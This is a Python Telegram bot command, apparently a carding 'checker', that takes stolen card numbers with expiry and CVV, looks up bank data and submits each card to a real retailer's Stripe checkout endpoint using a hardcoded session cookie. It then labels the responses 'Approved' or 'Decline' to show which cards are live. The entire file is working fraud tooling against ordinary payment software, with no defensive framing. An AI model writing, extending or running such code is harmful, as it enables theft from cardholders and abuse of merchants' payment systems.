import json

import requests

import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


from datos import idchat
@Client.on_message(filters.command(["00"], ["/", "."]))
async def ar(_, message: Message):
    
    with open(file='pr.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply("<b>⎚ Usar <code>/az card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply("<b>⎚ Usar <code>/az card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            bina = req['bin']
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            
            melo=await message.reply(f"""<b>⎚ Stripe | charged AzteKa
Card: <code>{ccs}</code>
Progress 🟠 1.0(s)</b>""")


                                        
              
            headers = {
                'authority': 'www.grana.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/json',
                'cookie': '_gcl_au=1.1.509496692.1678849469; __smVID=4ea3eac492053af714ad6390df7b80b3f2268e73afac8f0593e7879ca93b3f2a; _fbp=fb.1.1678849469812.522266937; _gid=GA1.2.1342021881.1678849471; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; store=en_us; _pin_unauth=dWlkPVlXSTRPR1k0WVRrdE56RTVPQzAwTWpaakxUazBNakF0WWpJNU5qVTNNak0yTVROaQ; __smToken=fbKNYJXACIvXurx1zvTFAgTC; form_key=bzxcB2xXJFv7W3iR; mage-banners-cache-storage=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; __smListBuilderShown=Tue%20Mar%2014%202023%2022:05:33%20GMT-0500%20(hora%20est%C3%A1ndar%20de%20Colombia); G_ENABLED_IDPS=google; newUser=1; gra-cid=269316; store_hk_en=ecpsm3e9pei8vt58858h2u7t60; PHPSESSID=i9ra0uqfidupajqr8d9dks1g12; _ga_HM00SKKGNZ=GS1.1.1678849501.1.1.1678849794.15.0.0; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2Nzg4NDk0NzEsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmdyYW5hLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2Nzg4NDk3OTYsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmdyYW5hLmNvbS8ifX0=; _derived_epik=dj0yJnU9UWllWHJiSzZTSktwLUx0Y2l2YnhMdG9oaUxkVzcydXombj11LURfUnA4Q0trb19PRnplcnZ4d2ZBJm09MSZ0PUFBQUFBR1FSTndNJnJtPTEmcnQ9QUFBQUFHUVJOd00mc3A9Mg; countryCode=US; _ga_KT9DMRN68M=GS1.1.1678849468.1.1.1678849813.0.0.0; private_content_version=c2b995b48f755859fa07af917f91c5c0; X-Magento-Vary=b4b27471cd488a8dbef04393499574597aa5c0f3; _ga=GA1.2.2052458354.1678849469; _gat_UA-49664111-1=1; cto_bundle=dduzu19FdVlJOFNQNGxaWE1Rb0dHQ2hyclJ4SGVKZWhKUGxUWXRvTGpyeHJ0cWxYSiUyQkRZdVpRWmFnTWNjaG4xWG1TMFlKY3JPJTJGR1RiOTBTdHRHVm5Iamd5RlptQURmUUk0MFh5SzcweDhCdjRNSko3dzFXdTJ1JTJGWXlPa3NnVTVNSk5GbHZLVmtQa3RyaWdLY0I5MGgzNUNkJTJCQSUzRCUzRA; section_data_ids=%7B%22directory-data%22%3A1678849477%2C%22customer%22%3A1678849477%2C%22compare-products%22%3A1678849477%2C%22last-ordered-items%22%3A1678849477%2C%22review%22%3A1678849477%2C%22cart%22%3A1678849477%2C%22wishlist%22%3A1678849477%2C%22multiplewishlist%22%3A1678849477%2C%22messages%22%3A1678849817%7D; _gali=csv-code-input',
                'origin': 'https://www.grana.com',
                'referer': 'https://www.grana.com/checkout/',
                'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQACUVNSABAFUVJQAgMOVg==',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'email': '',
                'paymentMethod': {
                    'additional_data': {
                        'cid': cvv,
                        'cc_exp_month': mes,
                        'cc_exp_year': ano,
                        'cc_number': cc,
                        'cc_cid': '353',
                        'cc_save': False,
                    },
                    'po_number': None,
                    'method': 'cryozonic_stripe',
                },
                'billingAddress': {
                    'saveInAddressBook': False,
                    'customer_address_id': '137549',
                },
            }

            response = session.post('https://www.grana.com/rest/en_us/V1/carts/mine/payment-information',headers=headers,json=json_data)
            msg = await melo.edit_text(f"""<b>⎚ Stripe | charged AzteKa
Card: <code>{ccs}</code>
Progress 🟢 3.12 (s)</b>""")
            
            if "Your card's security code is incorrect." in response.text:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: <code>{msgr}</code> ✅
⎚Response: incorrect_cvc
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>
</b> 
                </b>""")
            elif "Your card has insufficient funds." in response.text:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: <code>{msgr}</code> ✅
⎚Response: Approved
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>
                </b>""")
            elif "Your card's security code is invalid." in response.text:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: <code> [cvc - Incorrect]: {msgr}</code> ✅
⎚Response: Approved
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>

                </b>""")
            elif "Your card does not support this type of purchase." in response.text:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: <code>{msgr}</code> ✅
⎚Response: Aprovad
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>

                </b>""")
            elif "An error occurred while processing your card. Try again in a little bit." in response.text:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: Charged $10 ✅
⎚Response: Approved
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>

                </b>""")
            elif 'succeeded' in response.text:
                await msg.edit_text(f"""<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: succeeded✅
⎚Response: Approved
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>

                 
</b>""")
            else:
                msgr = response.json()['message']
                await msg.edit_text(f"""<b>
<b>⎚ Stripe | charged AzteKa

⎚Card: <code>{ccs}</code>
⎚Status: {msgr}
⎚Response:  Decline ❌
⎚Gate <code>Stripe | charged </code>
━━
⎚Pais: <code>{country_flag} {country}|{country_name}</code>
⎚Date: <code>{brand}-{typea}-{level}</code>
⎚Bank: <code>{bank}</code>
━━
⎚Proxy: Live!✅
⎚Taken: <code>8.81 (s) </code>
⎚Create <b><a href="tg://resolve?domain=Nefi503">Owner</a></b>

                 
</b>""")
        
        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')
   